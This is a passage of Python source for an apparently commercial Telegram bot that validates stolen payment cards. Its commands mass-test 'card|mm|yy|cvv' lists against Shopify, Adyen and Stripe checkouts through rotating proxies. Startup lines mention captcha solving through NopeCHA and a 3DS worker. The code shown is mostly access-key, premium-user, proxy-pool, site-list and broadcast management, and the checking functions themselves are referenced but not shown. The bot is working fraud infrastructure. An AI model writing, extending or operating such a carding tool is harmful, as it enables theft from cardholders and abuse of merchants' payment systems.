        await msg.edit(pe(f"❌ <b>Proxy  —  Dead</b>\n<b>{SEP}</b>\n📡 <code>{proxy}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/site'))
async def site_command(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe(f"❌ <b>Access Denied.</b>"), parse_mode='html')
        return
    sites   = get_user_sites(uid) or get_live_sites()
    proxies = get_proxies_for_user(uid) or load_proxies()
    if not sites or not proxies:
        await event.reply(pe(f"❌ <b>No sites/proxies</b>"), parse_mode='html')
        return
    smsg = await event.reply(pe(f"🔥 <b>Testing {len(sites)} sites...</b>"), parse_mode='html')
    alive, dead = [], []
    for i in range(0, len(sites), 10):
        batch   = sites[i:i+10]
        results = await asyncio.gather(*[test_site(s, random.choice(proxies)) for s in batch])
        for r in results:
            (alive if r['status'] in ('alive', 'step_error') else dead).append(r['site'])
        try:
            await smsg.edit(pe(
                f"🔥 <b>Testing sites...</b>\n"
                f"<b>{SEP}</b>\n"
                f"✅ Alive: {len(alive)}  ·  ❌ Dead: {len(dead)}"
            ), parse_mode='html')
        except Exception:
            pass
    async with aiofiles.open(SITES_FILE, 'w') as f:
        for s in alive: await f.write(f"{s}\n")
    await smsg.edit(pe(
        f"✅ <b>Site Check Complete</b>\n"
        f"<b>{SEP}</b>\n"
        f"<blockquote>✅ <b>Alive:</b>    {len(alive)}\n"
        f"❌ <b>Removed:</b>  {len(dead)}</blockquote>"
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/(rm|rmsite)\s+'))
async def remove_site_command(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html')
        return
    site = event.message.text.split(' ', 1)[1].strip()
    curr = load_sites()
    if site not in curr:
        await event.reply(pe(f"❌ <b>Site Not Found</b>"), parse_mode='html')
        return
    async with aiofiles.open(SITES_FILE, 'w') as f:
        for s in curr:
            if s != site: await f.write(f"{s}\n")
    global _SITES_CACHE
    _SITES_CACHE = [s for s in _SITES_CACHE if s != site]
    await event.reply(pe(f"✅ <b>Site Removed</b>\n<b>{SEP}</b>\n<code>{site}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/proxy'))
async def proxy_command(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe(f"❌ <b>Access Denied.</b>"), parse_mode='html')
        return
    proxies = load_proxies()
    if not proxies:
        await event.reply(pe(f"❌ <b>Proxy Pool Empty</b>"), parse_mode='html')
        return
    smsg = await event.reply(pe(f"🔥 <b>Testing {len(proxies)} proxies...</b>"), parse_mode='html')
    alive, dead = [], []
    for i in range(0, len(proxies), 50):
        results = await asyncio.gather(*[test_proxy(p) for p in proxies[i:i+50]])
        for r in results:
            (alive if r['status'] == 'alive' else dead).append(r['proxy'])
        try:
            await smsg.edit(pe(
                f"🔥 <b>Testing proxies...</b>\n"
                f"<b>{SEP}</b>\n"
                f"✅ Alive: {len(alive)}  ·  ❌ Dead: {len(dead)}"
            ), parse_mode='html')
        except Exception:
            pass
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for p in alive: await f.write(f"{p}\n")
    await smsg.edit(pe(
        f"✅ <b>Proxy Check Complete</b>\n"
        f"<b>{SEP}</b>\n"
        f"<blockquote>✅ <b>Alive:</b>    {len(alive)}\n"
        f"❌ <b>Removed:</b>  {len(dead)}</blockquote>"
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/myplan$'))
async def myplan_command(event):
    uid = event.sender_id
    lim = get_user_limit(uid)
    rec = _users_access.get(str(uid))
    expiry_txt = "Permanent"
    if rec and rec.get('expires_at'):
        rem = int(rec['expires_at'] - time.time())
        if rem > 0:
            h = rem // 3600
            m = (rem % 3600) // 60
            expiry_txt = f"{h}h {m}m left"
        else:
            expiry_txt = "Expired"

    if is_admin(uid):
        body = (f"👑 <b>Your Access</b>\n<b>{SEP}</b>\n<blockquote>"
                f"🔑 <b>Role</b>     »  Admin\n"
                f"⚡ <b>Status</b>  »  Full access\n"
                f"📋 <b>Limit</b>   »  {lim:,} cards/file"
                f"</blockquote>")
    elif is_premium(uid):
        body = (f"✅ <b>Your Access</b>\n<b>{SEP}</b>\n<blockquote>"
                f"🔑 <b>Role</b>     »  Premium\n"
                f"⏰ <b>Expires</b>  »  {expiry_txt}\n"
                f"📋 <b>Limit</b>   »  {lim:,} cards/file"
                f"</blockquote>")
    else:
        body = (f"🚫 <b>No Access</b>\n<b>{SEP}</b>\n"
                f"You are not on the access list.\n"
                f"Redeem a key with <code>/redeem KEY</code>\n"
                f"or contact the owner.")
    await event.reply(pe(body + f"\n<b>{SEP}</b>\n{DEV_LINE}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/admin$'))
async def admin_panel_cmd(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html')
        return
    await raw_send(event.sender_id, _admin_panel_text(), rows_admin())

@bot.on(events.NewMessage(pattern=r'^/setadmin(\s+.*)?$'))
async def setadmin_command(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html')
        return
    parts = event.message.text.strip().split()
    current_list = "\n".join(f"  • <code>{a}</code>" for a in sorted(ADMIN_IDS))
    if len(parts) < 3:
        await event.reply(pe(
            f"<b>👑 Admin Management</b>\n"
            f"<b>{SEP}</b>\n"
            f"<b>Current admins:</b>\n{current_list}\n"
            f"<b>{SEP}</b>\n"
            f"<b>Add:</b>    <code>/setadmin add [user_id]</code>\n"
            f"<b>Remove:</b> <code>/setadmin rm [user_id]</code>"
        ), parse_mode='html')
        return
    action = parts[1].lower()
    try:
        target = int(parts[2])
    except ValueError:
        await event.reply(pe(f"❌ <b>Invalid user ID.</b>"), parse_mode='html')
        return
    if action == "add":
        ADMIN_IDS.add(target)
        _save_admin_ids(ADMIN_IDS)
        _register_commands()
        await event.reply(pe(f"✅ <b>Admin Added</b>\n<b>{SEP}</b>\n<code>{target}</code>"), parse_mode='html')
    elif action in ("rm", "remove"):
        if target in _DEFAULT_ADMINS:
            await event.reply(pe(f"❌ <b>Cannot Remove Default Admin</b>"), parse_mode='html')
            return
        ADMIN_IDS.discard(target)
        _save_admin_ids(ADMIN_IDS)
        _register_commands()
        await event.reply(pe(f"✅ <b>Admin Removed</b>\n<b>{SEP}</b>\n<code>{target}</code>"), parse_mode='html')
    else:
        await event.reply(pe(f"❌ <b>Use add or rm</b>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addpremium\s+'))
async def add_premium_command(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html')
        return
    new_id = event.message.text.split(' ', 1)[1].strip()
    if not new_id.isdigit():
        await event.reply(pe(f"❌ Usage: <code>/addpremium 123456789</code>"), parse_mode='html')
        return
    _grant_access(int(new_id), 24 * 365 * 10, "admin-grant")
    await event.reply(pe(f"✅ <b>User Added</b>\n<b>{SEP}</b>\n<code>{new_id}</code> has 10,000-card access."), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmpremium\s+'))
async def remove_premium_command(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html')
        return
    rm_id = event.message.text.split(' ', 1)[1].strip()
    if rm_id in _users_access:
        del _users_access[rm_id]
        _save_users_access()
    curr = load_premium_users()
    if rm_id in curr:
        async with aiofiles.open(PREMIUM_FILE, 'w') as f:
            for u in curr:
                if u != rm_id: await f.write(f"{u}\n")
    await event.reply(pe(f"🚫 <b>User Removed</b>\n<b>{SEP}</b>\n<code>{rm_id}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addsite-admin\s+'))
async def add_site_command(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html')
        return
    new_site = event.message.text.split(' ', 1)[1].strip()
    if not new_site.startswith('http'):
        await event.reply(pe(f"❌ URL must start with <code>http</code>"), parse_mode='html')
        return
    curr = load_sites()
    if new_site in curr:
        await event.reply(pe(f"⚠️ <b>Site already exists.</b>"), parse_mode='html')
        return
    async with aiofiles.open(SITES_FILE, 'a') as f:
        await f.write(f"{new_site}\n")
    global _SITES_CACHE
    _SITES_CACHE.append(new_site)
    await event.reply(pe(f"✅ <b>Site Added</b>\n<b>{SEP}</b>\n<code>{new_site}</code>\n📋 Total: {len(_SITES_CACHE)}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/broadcast\s+'))
async def broadcast_command(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html')
        return
    msg_text    = event.message.text.split(' ', 1)[1].strip()
    all_targets = set()
    for u in load_premium_users():
        try: all_targets.add(int(u))
        except: pass
    for u in _users_access.keys():
        try: all_targets.add(int(u))
        except: pass
    for u in ADMIN_IDS:
        all_targets.add(u)
    if not all_targets:
        await event.reply(pe(f"⚠️ <b>No users.</b>"), parse_mode='html')
        return
    status_msg = await event.reply(pe(f"📡 <b>Broadcasting...</b>\n<b>{SEP}</b>\n📋 {len(all_targets)} users"), parse_mode='html')
    sent = 0; failed = 0
    for target in all_targets:
        try:
            await bot.send_message(target, pe(
                f"📢 <b>Announcement  —  {BOT_BRAND}</b>\n"
                f"<b>{SEP}</b>\n"
                f"{msg_text}\n"
                f"<b>{SEP}</b>\n"
                f"{DEV_LINE}"
            ), parse_mode='html')
            sent += 1
            await asyncio.sleep(0.1)
        except:
            failed += 1
    await status_msg.edit(pe(f"📡 <b>Broadcast Complete</b>\n<b>{SEP}</b>\n✅ {sent}  ·  ❌ {failed}"), parse_mode='html')


# ════════════════════════════════════════════════════════════
#  BOT CORE — D: callbacks + startup
# ════════════════════════════════════════════════════════════
@bot.on(events.CallbackQuery(pattern=b"gates"))
async def cb_gates(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.answer("❌ Access required!", alert=True)
        return
    text = pe(
        f"<b>💳 Checker</b>\n"
        f"<b>{SEP}</b>\n"
        f"<blockquote>"
        f"⚡ <b>Single</b>  <code>/sh card|mm|yy|cvv</code>\n"
        f"⚡ <b>Adyen</b>   <code>/ady LINK card|mm|yy|cvv</code>\n"
        f"⚡ <b>Stripe</b>  <code>/hit LINK card|mm|yy|cvv</code>\n"
        f"⚡ <b>Mass</b>    reply to <code>.txt</code> with <code>/msh</code>"
        f"</blockquote>\n"
        f"<b>{SEP}</b>\n"
        f"{DEV_LINE}"
    )
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, text, rows_gates())

@bot.on(events.CallbackQuery(pattern=b"manage_proxy"))
async def cb_manage_proxy(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.answer("❌ Access required!", alert=True)
        return
    user_list = get_user_proxy_list(uid)
    pool      = load_proxies()
    proxy_status = f"✅ {len(user_list)} proxy(ies) active 🔁" if user_list else "❌ No Personal Proxies"
    text = pe(
        f"<b>🔌 Proxy Manager</b>\n"
        f"<b>{SEP}</b>\n"
        f"<blockquote>"
        f"👤 <b>Personal</b>  »  {proxy_status}\n"
        f"📡 <b>Pool</b>      »  {len(pool)} shared proxies"
        f"</blockquote>\n"
        f"<b>{SEP}</b>\n"
        f"<code>/setproxy ip:port</code>\n"
        f"<b>{SEP}</b>\n"
        f"Clear: <code>/clearuserproxy</code>"
    )
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, text, rows_proxy(uid))

@bot.on(events.CallbackQuery(pattern=b"back_start"))
async def cb_back_start(event):
    uid = event.sender_id
    try:
        sender    = await bot.get_entity(uid)
        username  = f"@{sender.username}" if sender.username else f"ID:{uid}"
        firstname = sender.first_name or "User"
    except:
        username  = f"ID:{uid}"
        firstname = "User"
    lim = get_user_limit(uid)
    if is_admin(uid):
        status_icon = "👑"; status_line = "Admin"
    elif is_premium(uid):
        status_icon = "✅"; status_line = "Premium"
    else:
        status_icon = "🚫"; status_line = "No Access"
    text = pe(
        f"<b>⚡ Welcome, {firstname}!</b>\n"
        f"<b>{SEP}</b>\n"
        f"<blockquote>"
        f"👤 <b>User</b>     »  {username}\n"
        f"🆔 <b>ID</b>       »  <code>{uid}</code>\n"
        f"{status_icon} <b>Status</b>  »  {status_line}\n"
        f"📋 <b>Limit</b>   »  {lim if lim else '—'} cards/file"
        f"</blockquote>\n"
        f"<b>{SEP}</b>\n"
        f"{DEV_LINE}"
    )
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, text, rows_main())

@bot.on(events.CallbackQuery(pattern=b"close"))
async def cb_close(event):
    await event.answer()
    try:
        await bot.delete_messages(event.chat_id, event.message_id)
    except:
        pass

@bot.on(events.CallbackQuery(pattern=b"stop_mass"))
async def cb_stop_mass(event):
    uid = event.sender_id
    killed = 0
    for k in list(active_sessions.keys()):
        if k.startswith(f"{uid}_"):
            active_sessions.pop(k, None)
            killed += 1
    if killed:
        await event.answer("⛔ Mass check stopped!", alert=True)
        try:
            await raw_edit(event.chat_id, event.message_id,
                           pe(f"⛔ <b>Mass Check  —  Stopped</b>\n<b>{SEP}</b>\nCancelled by user."), [])
        except:
            pass
    else:
        await event.answer("No active session.", alert=True)

@bot.on(events.CallbackQuery(pattern=b"toggle_pool"))
async def cb_toggle_pool(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.answer("❌ Access required!", alert=True)
        return
    current = user_pool_enabled.get(uid, True)
    user_pool_enabled[uid] = not current
    save_user_pool()
    state = "ON ✅" if not current else "OFF ⚡"
    await event.answer(f"Proxy Pool  →  {state}", alert=False)
    user_list = get_user_proxy_list(uid)
    pool      = load_proxies()
    proxy_status = f"✅ {len(user_list)} proxy(ies) active 🔁" if user_list else "❌ No Personal Proxies"
    text = pe(
        f"<b>🔌 Proxy Manager</b>\n"
        f"<b>{SEP}</b>\n"
        f"<blockquote>"
        f"👤 <b>Personal</b>  »  {proxy_status}\n"
        f"📡 <b>Pool</b>      »  {len(pool)} shared proxies"
        f"</blockquote>\n"
        f"<b>{SEP}</b>\n"
        f"Clear: <code>/clearuserproxy</code>"
    )
    await nav_edit(event.chat_id, event.message_id, text, rows_proxy(uid))

@bot.on(events.CallbackQuery(pattern=b"test_proxy_btn"))
async def cb_test_proxy_btn(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.answer("❌ Access required!", alert=True)
        return
    user_list = get_user_proxy_list(uid)
    if not user_list:
        await event.answer("❌ No proxy set.", alert=True)
        return
    proxy = user_list[0]
    await event.answer("⏳ Testing...", alert=False)
    r        = await test_proxy(proxy)
    is_alive = r.get('status') == 'alive'
    if is_alive:
        ip_info = await get_proxy_ip(proxy)
        await event.answer(f"✅ Alive — {ip_info or 'N/A'}", alert=True)
    else:
        await event.answer("❌ Proxy Dead", alert=True)

@bot.on(events.CallbackQuery(pattern=b"remove_proxy_btn"))
async def cb_remove_proxy_btn(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.answer("❌ Access required!", alert=True)
        return
    remove_user_proxy(uid)
    await event.answer("✅ Proxy removed!", alert=True)
    user_list = get_user_proxy_list(uid)
    pool      = load_proxies()
    proxy_status = f"✅ {len(user_list)} proxy(ies) active 🔁" if user_list else "❌ No Personal Proxies"
    text = pe(
        f"<b>🔌 Proxy Manager</b>\n"
        f"<b>{SEP}</b>\n"
        f"<blockquote>"
        f"👤 <b>Personal</b>  »  {proxy_status}\n"
        f"📡 <b>Pool</b>      »  {len(pool)} shared proxies"
        f"</blockquote>\n"
        f"<b>{SEP}</b>\n"
        f"Clear: <code>/clearuserproxy</code>"
    )
    await nav_edit(event.chat_id, event.message_id, text, rows_proxy(uid))

@bot.on(events.CallbackQuery(pattern=b"admin_panel"))
async def cb_admin_panel(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, _admin_panel_text(), rows_admin())

@bot.on(events.CallbackQuery(pattern=b"admin_users"))
async def cb_admin_users(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    pcount = len(load_premium_users()) + len(_users_access)
    text = pe(f"<b>👤 User Management</b>\n<b>{SEP}</b>\n<blockquote>✅ <b>Access List</b>  »  {pcount} users</blockquote>\n<b>{SEP}</b>\n{DEV_LINE}")
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, text, rows_admin_users())

@bot.on(events.CallbackQuery(pattern=b"admin_sites"))
async def cb_admin_sites(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    scount = len(load_sites())
    text = pe(f"<b>🌐 Site Management</b>\n<b>{SEP}</b>\n<blockquote>🌐 <b>Active Sites</b>  »  {scount}</blockquote>\n<b>{SEP}</b>\n<b>Add:</b> <code>/addsite-admin URL</code>\n<b>Remove:</b> <code>/rmsite URL</code>\n<b>Reload:</b> <code>/reloadsites</code>")
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, text, rows_admin_sites())

@bot.on(events.CallbackQuery(pattern=b"admin_proxy_pool"))
async def cb_admin_proxy_pool(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    prcount = len(load_proxies())
    text = pe(f"<b>📡 Proxy Pool</b>\n<b>{SEP}</b>\n<blockquote>📡 <b>Pool Size</b>  »  {prcount}</blockquote>\n<b>{SEP}</b>\n<b>Add:</b> <code>/addproxy ip:port</code>\n<b>Clear:</b> <code>/clearproxy</code>")
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, text, rows_admin_proxy_pool())

@bot.on(events.CallbackQuery(pattern=b"admin_broadcast_info"))
async def cb_admin_broadcast_info(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    total = len(load_premium_users()) + len(_users_access) + len(ADMIN_IDS)
    text = pe(f"<b>📢 Broadcast</b>\n<b>{SEP}</b>\n<blockquote>📋 <b>Reach</b>  »  ~{total} users</blockquote>\n<b>{SEP}</b>\nUsage: <code>/broadcast Message</code>")
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, text, [[{"text": "↪️  Back", "callback_data": "admin_panel"}]])

@bot.on(events.CallbackQuery(pattern=b"admin_list_users"))
async def cb_admin_list_users(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    curr = load_premium_users()
    acc  = list(_users_access.keys())
    combined = list(dict.fromkeys(curr + acc))[:30]
    if not combined:
        await event.answer("📋 No users.", alert=True)
        return

    lines_list = []
    for i, u in enumerate(combined, 1):
        rec = _users_access.get(str(u), {})
        uname = rec.get('username') or ''
        fname = rec.get('first_name') or ''
        if uname:
            label = f"@{uname}"
        elif fname:
            label = fname
        else:
            try:
                name, fetched_uname = await get_user_info(int(u))
                if fetched_uname:
                    label = f"@{fetched_uname}"
                elif name and name != str(u):
                    label = name
                else:
                    label = str(u)
            except Exception:
                label = str(u)
        lines_list.append(f"  {i}. {label} (<code>{u}</code>)")

    body = "\n".join(lines_list)
    await event.answer()
    await nav_edit(
        event.chat_id, event.message_id,
        pe(f"<b>📋 Access List  ({len(combined)})</b>\n<b>{SEP}</b>\n{body}"),
        [[{"text": "↪️  Back", "callback_data": "admin_users"}]]
    )

@bot.on(events.CallbackQuery(pattern=b"admin_add_user_info"))
async def cb_admin_add_user_info(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, pe(f"<b>✅ Add User</b>\n<b>{SEP}</b>\nUsage: <code>/addpremium [user_id]</code>"), [[{"text": "↪️  Back", "callback_data": "admin_users"}]])

@bot.on(events.CallbackQuery(pattern=b"admin_rm_user_info"))
async def cb_admin_rm_user_info(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, pe(f"<b>❌ Remove User</b>\n<b>{SEP}</b>\nUsage: <code>/rmpremium [user_id]</code>"), [[{"text": "↪️  Back", "callback_data": "admin_users"}]])

@bot.on(events.CallbackQuery(pattern=b"admin_list_sites_cb"))
async def cb_admin_list_sites(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    curr = load_sites()
    if not curr:
        await event.answer("🌐 No sites.", alert=True)
        return
    lines = "\n".join(f"  {i+1}. <code>{s}</code>" for i, s in enumerate(curr[:20]))
    extra = f"\n  <i>+{len(curr)-20} more</i>" if len(curr) > 20 else ""
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, pe(f"<b>🌐 Sites  ({len(curr)})</b>\n<b>{SEP}</b>\n{lines}{extra}"), [[{"text": "↪️  Back", "callback_data": "admin_sites"}]])

@bot.on(events.CallbackQuery(pattern=b"admin_add_site_info"))
async def cb_admin_add_site_info(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, pe(f"<b>✅ Add Site</b>\n<b>{SEP}</b>\nUsage: <code>/addsite-admin URL</code>"), [[{"text": "↪️  Back", "callback_data": "admin_sites"}]])

@bot.on(events.CallbackQuery(pattern=b"admin_rm_site_info"))
async def cb_admin_rm_site_info(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, pe(f"<b>❌ Remove Site</b>\n<b>{SEP}</b>\nUsage: <code>/rmsite URL</code>"), [[{"text": "↪️  Back", "callback_data": "admin_sites"}]])

@bot.on(events.CallbackQuery(pattern=b"admin_list_proxy_cb"))
async def cb_admin_list_proxy(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    curr = load_proxies()
    if not curr:
        await event.answer("📡 Pool empty.", alert=True)
        return
    lines = "\n".join(f"  {i+1}. <code>{p}</code>" for i, p in enumerate(curr[:20]))
    extra = f"\n  <i>+{len(curr)-20} more</i>" if len(curr) > 20 else ""
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, pe(f"<b>📡 Proxy Pool  ({len(curr)})</b>\n<b>{SEP}</b>\n{lines}{extra}"), [[{"text": "↪️  Back", "callback_data": "admin_proxy_pool"}]])

@bot.on(events.CallbackQuery(pattern=b"admin_add_proxy_info"))
async def cb_admin_add_proxy_info(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, pe(f"<b>✅ Add Proxies</b>\n<b>{SEP}</b>\n<code>/addproxy ip:port</code>"), [[{"text": "↪️  Back", "callback_data": "admin_proxy_pool"}]])

@bot.on(events.CallbackQuery(pattern=b"admin_clear_proxy_cb"))
async def cb_admin_clear_proxy(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True)
        return
    curr = load_proxies()
    if not curr:
        await event.answer("Pool empty.", alert=True)
        return
    with open(PROXY_FILE, 'w') as f:
        f.write("")
    await event.answer(f"✅ Cleared {len(curr)} proxies!", alert=True)
    await nav_edit(event.chat_id, event.message_id, _admin_panel_text(), rows_admin())

@bot.on(events.CallbackQuery(pattern=r"^start_check_\d+$"))
async def cb_start_check(event):
    uid        = event.sender_id
    data       = event.data.decode()
    target_uid = int(data.split('_')[-1])
    if uid != target_uid:
        await event.answer("❌ Not your check!", alert=True)
        return
    info = pending_checks.pop(uid, None)
    if not info:
        await event.answer("⚠️ Session expired.", alert=True)
        return
    cards   = info['cards']
    sites   = get_user_sites(uid) or get_live_sites()
    proxies = get_proxies_for_user(uid)
    if not sites or not proxies:
        await event.answer("❌ No sites/proxies.", alert=True)
        return
    await event.answer("🔥 Starting!", alert=False)
    text = pe(
        f"<b>🔥 Mass Check  —  Starting</b>\n"
        f"<b>{SEP}</b>\n"
        f"📋 <b>Total</b>      »  {len(cards)}\n"
        f"<code>{make_progress_bar(0, len(cards))}</code>"
    )
    msg_id = await raw_send(uid, text, rows_stop())
    if msg_id:
        asyncio.create_task(run_mass_check(uid, cards, msg_id))

@bot.on(events.CallbackQuery(pattern=b"noop"))
async def cb_noop(event):
    await event.answer()


def _register_commands():
    user_cmds = [
        {"command": "start",          "description": "🚀 Open dashboard"},
        {"command": "sh",             "description": "⚡ Single Shopify check"},
        {"command": "msh",            "description": "🔥 Mass Shopify check"},
        {"command": "ady",            "description": "⚡ Adyen check"},
        {"command": "hit",            "description": "💳 Stripe checkout check"},
        {"command": "redeem",         "description": "🔑 Redeem a key"},
        {"command": "myplan",         "description": "💎 Your access"},
        {"command": "setproxy",       "description": "🔌 Set proxy"},
        {"command": "addproxies",     "description": "📡 Add proxies from .txt"},
        {"command": "clearuserproxy", "description": "🗑️ Clear proxy"},
        {"command": "chkproxy",       "description": "✅ Test proxy"},
        {"command": "addsite",        "description": "🌐 Add sites"},
        {"command": "mysites",        "description": "📋 View your sites"},
    ]
    admin_cmds = user_cmds + [
        {"command": "admin",       "description": "👑 Admin panel"},
        {"command": "key",         "description": "🔑 Generate keys"},
        {"command": "listkeys",    "description": "📋 List keys"},
        {"command": "revokey",     "description": "🗑️ Revoke key"},
        {"command": "addpremium",  "description": "✅ Add user"},
        {"command": "rmpremium",   "description": "❌ Remove user"},
        {"command": "addsite-admin", "description": "🌐 Add site (admin)"},
        {"command": "rmsite",      "description": "🗑️ Remove site"},
        {"command": "reloadsites", "description": "🔄 Reload sites from GitHub"},
        {"command": "sitescount",  "description": "📊 Sites count"},
        {"command": "addproxy",    "description": "📡 Add proxy to shared pool"},
        {"command": "clearproxy",  "description": "🗑️ Clear pool"},
        {"command": "broadcast",   "description": "📢 Broadcast"},
        {"command": "setadmin",    "description": "👑 Manage admins"},
    ]
    base = f"https://api.telegram.org/bot{BOT_TOKEN}"
    try:
        _http_session.post(f"{base}/setMyCommands",
                           json={"commands": user_cmds}, timeout=5)
        _http_session.post(f"{base}/setMyCommands",
                           json={"commands": admin_cmds,
                                 "scope": {"type": "chat", "chat_id": OWNER_ID}},
                           timeout=5)
        for aid in ADMIN_IDS:
            if aid != OWNER_ID:
                _http_session.post(f"{base}/setMyCommands",
                                   json={"commands": admin_cmds,
                                         "scope": {"type": "chat", "chat_id": aid}},
                                   timeout=5)
    except:
        pass


# ════════════════════════════════════════════════════════════
#  STARTUP
# ════════════════════════════════════════════════════════════
_register_commands()
_bin_count = load_bins()

async def _boot_reload():
    n = await reload_sites()
    print(f"✅ Sites loaded: {n:,}")

async def _main():
    await _boot_reload()
    print(f"✅ {BOT_BRAND} started successfully! (BIN DB: {_bin_count:,} entries)")
    print(f"🔐 NopeCHA: {'enabled' if NOPECHA_API_KEY else 'disabled (no key)'}")
    print(f"🔐 Adyen 3DS worker: {ADYEN_3DS_WORKER or 'disabled (inline fallback)'}")
    print(f"📡 GitHub repo: {GITHUB_REPO or 'not set (using local sites.txt)'}")
    await bot.run_until_disconnected()

bot.loop.run_until_complete(_main())